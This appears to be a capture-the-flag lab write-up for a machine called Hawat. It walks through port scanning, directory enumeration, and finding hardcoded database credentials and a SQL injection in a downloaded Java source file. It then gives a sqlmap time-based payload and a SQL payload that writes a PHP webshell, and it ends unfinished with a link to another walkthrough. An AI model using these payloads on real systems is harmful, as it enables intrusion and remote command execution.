---
description: Broken for me.
---

# Hawat

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.157.147
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-14 12:15 +08
Warning: 192.168.157.147 giving up on port because retransmission cap hit (10).
Stats: 0:03:25 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 85.65% done; ETC: 12:19 (0:00:35 remaining)
Nmap scan report for 192.168.157.147
Host is up (0.17s latency).
Not shown: 65481 filtered tcp ports (no-response), 50 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
17445/tcp open  unknown
30455/tcp open  unknown
50080/tcp open  unknown
```

Did a detailed scan on the non HTTP ports.&#x20;

```
$ sudo nmap -p 17445,30455,50080 -sC -sV --min-rate 4000 192.168.157.147
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-14 12:19 +08
Nmap scan report for 192.168.157.147
Host is up (0.18s latency).

PORT      STATE SERVICE VERSION
17445/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Fri, 14 Jul 2023 04:20:05 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <title>Issue Tracker</title>
|     <link href="/css/bootstrap.min.css" rel="stylesheet" />
|     </head>
|     <body>
|     <section>
|     <div class="container mt-4">
|     <span>
|     <div>
|     href="/login" class="btn btn-primary" style="float:right">Sign In</a> 
|     href="/register" class="btn btn-primary" style="float:right;margin-right:5px">Register</a>
|     </div>
|     </span>
|     <br><br>
|     <table class="table">
|     <thead>
|     <tr>
|     <th>ID</th>
|     <th>Message</th>
|     <th>P
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Length: 0
|     Date: Fri, 14 Jul 2023 04:20:05 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 14 Jul 2023 04:20:05 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
30455/tcp open  http    nginx 1.18.0
|_http-title: W3.CSS
|_http-server-header: nginx/1.18.0
50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
|_http-title: W3.CSS Template
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
| http-methods:
```

### Web Enum -> Source Code

Port 17445 had some kind of ticket creator:

<figure><img src="../../../.gitbook/assets/image (3548).png" alt=""><figcaption></figcaption></figure>

Default creds didn't work, so let's move on. Port 30445 just didn't load for me for some reason.&#x20;

Port 50080 shows a Pizza website:

<figure><img src="../../../.gitbook/assets/image (3717).png" alt=""><figcaption></figcaption></figure>

The website was rather static. I did a directory scan on all the ports. Port 50080 has a `/cloud` directory:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.157.147:50080 -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.157.147:50080
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/07/14 12:24:36 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 244] [--> http://192.168.157.147:50080/images/]
/4                    (Status: 301) [Size: 239] [--> http://192.168.157.147:50080/4/]
/cloud                (Status: 301) [Size: 243] [--> http://192.168.157.147:50080/cloud/]
```

When viewed, it shows a login page:

<figure><img src="../../../.gitbook/assets/image (3549).png" alt=""><figcaption></figcaption></figure>

We can login with `admin:admin`. There, we see an `issuetracker.zip` file:

<figure><img src="../../../.gitbook/assets/image (3193).png" alt=""><figcaption></figcaption></figure>

We can download this to our Kali machine and unzip it. This would reveal source code for a website.

```
$ ll
total 32
-rw-r--r-- 1 kali kali  1495 Feb  2  2021 HELP.md
-rwxr-xr-x 1 kali kali 10070 Feb  2  2021 mvnw
-rw-r--r-- 1 kali kali  6608 Feb  2  2021 mvnw.cmd
-rw-rw-r-- 1 kali kali  2248 Feb  5  2021 pom.xml
drwxr-xr-x 4 kali kali  4096 Feb  2  2021 src
```

### Source Code Analysis -> SQLI RCE

The source code was in Java and for the application running on port 17445. I looked thorugh the files and found this within `src/main/java/com/issue/tracker/issues/IssueController.java`:

```java
        @GetMapping("/issue/checkByPriority")
        public String checkByPriority(@RequestParam("priority") String priority, Model model) {
                // 
                // Custom code, need to integrate to the JPA
                //
            Properties connectionProps = new Properties();
            connectionProps.put("user", "issue_user");
            connectionProps.put("password", "ManagementInsideOld797");
        try {
                        conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
                    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
            System.out.println(query);
                    Statement stmt = conn.createStatement();
                    stmt.executeQuery(query);
```

This bit of code here gave us credentials, and also is vulnerable to SQL injection since the `priority` variable is not sanitsed before being passed in. I registed a user on the machine, and then proceeded to test the SQL Injection using `sqlmap`:

```
$ sqlmap -r req
---
Parameter: priority (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: priority=' AND (SELECT 3165 FROM (SELECT(SLEEP(5)))JlSD) AND 'aCou'='aCou
---
```

Normally, this should be rather easy to write a webshell using a payload like this:

```sql
' union select '<?php system($_REQUEST['cmd']); ?>' into outfile '/srv/http/cmd.php' -- -
```

However I don't know the document root, and `sqlmap` brute force doesn't seem to work. I took a hint and realised that port 30445 was supposed to host `phpinfo.php`, but it was unresponsive.&#x20;

I read the walkthrough and it shows that `/srv/http` is the document root taken from `phpinfo.php`, which would allow me to write a webshell to port 30445.

Here's a link to the supposed solution:

{% embed url="https://bing0o.github.io/posts/pg-hawat/" %}
